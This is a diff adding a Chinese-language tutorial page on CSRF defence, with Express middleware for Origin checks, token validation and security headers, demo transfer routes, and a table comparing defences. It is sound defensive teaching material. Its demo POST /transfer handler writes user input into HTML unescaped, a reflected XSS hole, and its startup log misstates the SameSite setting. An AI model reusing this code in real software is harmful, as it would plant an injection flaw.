+  if (CONFIG.EXEMPT_PATHS.some(p => req.path.startsWith(p))) return next();
+
+  const origin = req.headers.origin;
+  if (origin) {
+    if (!CONFIG.ALLOWED_ORIGINS.includes(origin)) {
+      console.warn(`[SECURITY] Blocked invalid Origin: ${origin} for ${req.path}`);
+      return res.status(403).json({
+        error: 'ORIGIN_NOT_ALLOWED',
+        message: 'Request origin is not in the allowed list'
+      });
+    }
+  }
+  // Origin 缺失时依赖 CSRF Token 验证
+  next();
+}
+
+// ============================================================
+// CSRF Token 验证中间件
+// ============================================================
+
+function csrfMiddleware(req, res, next) {
+  // 生成 Token 并提供给路由/模板使用
+  const token = CSRFProtection.generateToken(req);
+  req.csrfToken = () => token;
+  res.locals.csrfToken = token;
+
+  // 设置 Double Submit Cookie（供前端 JS 读取）
+  res.cookie(CONFIG.TOKEN_COOKIE, token, {
+    httpOnly: false,   // 前端 JS 需要读取！
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'strict',
+    path: '/'
+  });
+
+  // 安全方法不需要验证
+  if (CONFIG.SAFE_METHODS.has(req.method)) return next();
+
+  // 豁免路径（使用其他验证方式，如 Webhook Signature）
+  if (CONFIG.EXEMPT_PATHS.some(p => req.path.startsWith(p))) return next();
+
+  // 验证 Token
+  const clientToken = CSRFProtection.extractToken(req);
+  if (!CSRFProtection.validateToken(req, clientToken)) {
+    console.warn(`[CSRF] Validation failed: ${req.method} ${req.path}`, {
+      ip: req.ip,
+      origin: req.headers.origin || 'N/A',
+      referer: req.headers.referer || 'N/A',
+      userAgent: (req.headers['user-agent'] || '').substring(0, 100)
+    });
+
+    return res.status(403).json({
+      error: 'CSRF_TOKEN_INVALID',
+      message: 'CSRF token validation failed. Please refresh the page and try again.'
+    });
+  }
+
+  next();
+}
+
+// ============================================================
+// 安全响应头中间件
+// ============================================================
+
+function securityHeadersMiddleware(req, res, next) {
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  res.setHeader('X-XSS-Protection', '0');
+  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
+  next();
+}
+
+// ============================================================
+// 应用中间件（顺序重要）
+// ============================================================
+
+app.use(securityHeadersMiddleware);
+app.use(originCheckMiddleware);
+app.use(csrfMiddleware);
+
+// ============================================================
+// 路由示例
+// ============================================================
+
+// 获取 CSRF Token（SPA 初始化时调用）
+app.get('/api/csrf-token', (req, res) => {
+  res.json({ csrfToken: req.csrfToken() });
+});
+
+// 传统服务端渲染表单
+app.get('/transfer', (req, res) => {
+  res.send(`
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+      &lt;meta name="csrf-token" content="${res.locals.csrfToken}"&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+      &lt;h1&gt;转账&lt;/h1&gt;
+      &lt;form method="POST" action="/transfer"&gt;
+        &lt;input type="hidden" name="${CONFIG.TOKEN_FIELD}" value="${res.locals.csrfToken}"&gt;
+        &lt;label&gt;收款人：&lt;input name="to" required&gt;&lt;/label&gt;&lt;br&gt;
+        &lt;label&gt;金额：&lt;input name="amount" type="number" required&gt;&lt;/label&gt;&lt;br&gt;
+        &lt;button type="submit"&gt;确认转账&lt;/button&gt;
+      &lt;/form&gt;
+
+      &lt;hr&gt;
+      &lt;h2&gt;AJAX 转账&lt;/h2&gt;
+      &lt;button onclick="ajaxTransfer()"&gt;AJAX 转账&lt;/button&gt;
+
+      &lt;script&gt;
+        // === 前端 CSRF Token 处理 ===
+
+        // 方式1：从 meta 标签读取
+        const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
+
+        // 方式2：从 Cookie 读取
+        // const csrfToken = document.cookie.match(/XSRF-TOKEN=([^;]+)/)?.[1];
+
+        async function ajaxTransfer() {
+          const resp = await fetch('/api/transfer', {
+            method: 'POST',
+            credentials: 'same-origin',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-CSRF-Token': csrfToken    // 通过自定义 Header 传递
+            },
+            body: JSON.stringify({ to: 'alice', amount: 100 })
+          });
+          const data = await resp.json();
+          alert(JSON.stringify(data));
+        }
+      &lt;/script&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+  `);
+});
+
+// POST 处理（已通过 CSRF 中间件验证）
+app.post('/transfer', (req, res) => {
+  const { to, amount } = req.body;
+  res.send(`&lt;h1&gt;转账成功&lt;/h1&gt;&lt;p&gt;已向 ${to} 转账 ${amount} 元&lt;/p&gt;`);
+});
+
+// JSON API
+app.post('/api/transfer', (req, res) => {
+  const { to, amount } = req.body;
+  res.json({ success: true, message: `已转账 ${amount} 到 ${to}` });
+});
+
+// Webhook（豁免 CSRF，使用签名验证）
+app.post('/webhook/stripe', (req, res) => {
+  // Webhook 使用自己的签名验证机制，不需要 CSRF Token
+  const signature = req.headers['stripe-signature'];
+  // 验证 Stripe Webhook 签名...
+  res.json({ received: true });
+});
+
+// ============================================================
+// 启动
+// ============================================================
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server running on https://localhost:${PORT}`);
+  console.log('CSRF protection: enabled');
+  console.log('SameSite Cookie: Lax');
+  console.log('Origin check: enabled');
+});</code></pre>
+
+    <h3>8.3 防御方案对比总结</h3>
+    <table>
+      <thead><tr><th>防御方案</th><th>防御强度</th><th>实现复杂度</th><th>适用场景</th><th>已知弱点</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Synchronizer Token</strong></td><td>⭐⭐⭐⭐⭐</td><td>中等</td><td>有状态应用（有 Session）</td><td>XSS 可窃取 Token</td></tr>
+        <tr><td><strong>Double Submit Cookie</strong></td><td>⭐⭐⭐⭐</td><td>低</td><td>无状态应用 / 分布式系统</td><td>子域名 Cookie 注入</td></tr>
+        <tr><td><strong>Signed Double Submit</strong></td><td>⭐⭐⭐⭐⭐</td><td>中等</td><td>无状态应用（增强版）</td><td>XSS 可窃取 Token</td></tr>
+        <tr><td><strong>SameSite Cookie</strong></td><td>⭐⭐⭐⭐</td><td>极低</td><td>所有场景（作为补充层）</td><td>旧浏览器/Lax允许GET/Same-Site绕过</td></tr>
+        <tr><td><strong>Origin/Referer 验证</strong></td><td>⭐⭐⭐</td><td>低</td><td>作为辅助验证层</td><td>可被剥离/绕过</td></tr>
+        <tr><td><strong>Custom Header</strong></td><td>⭐⭐⭐⭐</td><td>低</td><td>纯 AJAX 应用（无表单提交）</td><td>Flash/旧浏览器绕过（已过时）</td></tr>
+        <tr><td><strong>二次验证</strong></td><td>⭐⭐⭐⭐⭐</td><td>高</td><td>极敏感操作（转账/改密码）</td><td>用户体验差</td></tr>
+      </tbody>
+    </table>
+
+    <h3>8.4 最佳实践：纵深防御体系</h3>
+    <div class="info-box note">
+      <div class="box-title">推荐的 CSRF 纵深防御策略</div>
+      <p>不依赖单一防御措施，多层防护相互补充：</p>
+      <ol>
+        <li><strong>第一层 - 浏览器级</strong>：SameSite=Lax Cookie（零成本，默认开启）</li>
+        <li><strong>第二层 - 应用级</strong>：CSRF Token（核心防线，Synchronizer 或 Signed Double Submit）</li>
+        <li><strong>第三层 - HTTP 级</strong>：Origin/Referer Header 验证（额外保障）</li>
+        <li><strong>第四层 - 业务级</strong>：关键操作二次确认（密码验证/短信验证码/人脸识别）</li>
+      </ol>
+      <p><strong>前提条件</strong>：修复所有 XSS 漏洞 —— XSS 可以击败上述所有 CSRF 防御！</p>
+      <p><strong>设计原则</strong>：</p>
+      <ul>
+        <li>GET 请求永远不执行状态修改操作</li>
+        <li>所有状态修改请求使用 POST/PUT/DELETE</li>
+        <li>Cookie 设置 Secure + HttpOnly + SameSite</li>
+        <li>定期审计子域名，防止 Subdomain Takeover</li>
+      </ul>
+    </div>
+
+    <div class="nav-footer">
+      <a href="01_XSS攻击.html">&larr; XSS 跨站脚本攻击</a>
+      <a href="03_XXE注入.html">XXE 外部实体注入 &rarr;</a>
+    </div>
+  </main>
+</div>
+</body>
+</html>
